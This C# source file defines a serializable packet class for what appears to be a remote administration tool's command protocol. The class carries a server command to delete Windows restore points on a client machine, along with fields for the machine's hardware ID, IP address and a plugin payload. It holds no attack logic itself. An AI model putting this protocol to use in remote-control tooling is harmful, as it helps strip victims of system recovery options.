using System;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace PacketLib.Packet
{
    [Serializable]
    public class DeleteRestorePointPacket : IPacket
    {
        //server
        public DeleteRestorePointPacket(int index) : base()
        {
            PacketType = PacketType.UAC_DELETE_RESTORE_POINT;

            this.index = index;
        }

        //client
        public DeleteRestorePointPacket(int index, bool deleted, string baseIp, string HWID) : base()
        {
            PacketType = PacketType.UAC_DELETE_RESTORE_POINT;
            this.BaseIp = baseIp;
            this.HWID = HWID;

            this.index = index;
            this.deleted = deleted;
        }

        public string HWID { get; set; }
        public string BaseIp { get; set; }
        public byte[] Plugin { get; set; }
        public PacketType PacketType { get; }
        public PacketState PacketState { get; set; }
        public string Status { get; set; }
        public string DatePacketStatus { get; set; }
        public int PacketSize { get; set; }

        public int index { get; set; }
        public bool deleted { get; set; }
    }
}
